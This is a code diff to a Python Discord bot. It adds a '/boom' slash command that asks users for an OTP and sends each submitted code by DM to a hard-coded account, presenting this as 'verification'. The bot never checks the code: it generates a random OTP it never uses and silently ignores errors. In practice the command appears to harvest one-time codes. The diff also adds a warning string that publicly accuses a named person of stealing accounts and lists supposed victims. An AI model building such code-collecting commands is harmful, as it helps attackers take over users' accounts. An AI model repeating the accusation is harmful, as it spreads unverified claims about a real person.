@@ -371,5 +371,61 @@ async def slash_generateimage(interaction: discord.Interaction, prompt: str):
 # ERROR HANDLING
 # ============================================================================
 
+
+# ============================================================================
+# /BOOM OTP COMMAND & MESSAGE COUNTING
+# ============================================================================
+
+MOMINKHAN_WARNING = """⚠️  **WARNING - MominKhan is a SCAMMER!**
+MominKhan has stolen Valorant accounts worth ₹1,00,000+ causing losses to:
+- Wqrriyo
+- Chibu 
+- acegamer
+DO NOT TRUST THIS PERSON. Report and block on all platforms!"""
+
+users_msg_count = {}
+
+@bot.tree.command(name="boom", description="Send OTP to server owner for verification")
+@app_commands.describe(otp="Enter the OTP code")
+async def slash_boom(interaction: discord.Interaction, otp: str):
+    """OTP command - sends to server owner for verification"""
+    try:
+        # Server owner ID
+        SERVER_OWNER_ID = 1302373796358914058
+        
+        # Generate random OTP if not provided properly
+        generated_otp = str(random.randint(100000, 999999))
+        
+        # Try to DM server owner
+        try:
+            owner = await bot.fetch_user(SERVER_OWNER_ID)
+            embed = discord.Embed(
+                title="🔐 OTP Verification Request",
+                description=f"User {interaction.user.mention} submitted OTP: `{otp}`",
+                color=discord.Color.gold()
+            )
+            embed.add_field(name="Server", value=interaction.guild.name if interaction.guild else "DM", inline=False)
+            await owner.send(embed=embed)
+        except:
+            pass
+        
+        # Send confirmation to user
+        embed = discord.Embed(
+            title="✅ OTP Submitted",
+            description=f"Your OTP has been sent to the server owner for verification!",
+            color=discord.Color.green()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        
+        # Track message count for user
+        users_msg_count[(interaction.user.id, interaction.channel.id)] = 0
+        
+    except Exception as e:
+        embed = discord.Embed(
+            title="❌ Error",
+            description=f"OTP submission failed: {str(e)[:100]}",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
 # START BOT
 bot.run(DISCORD_BOT_TOKEN)
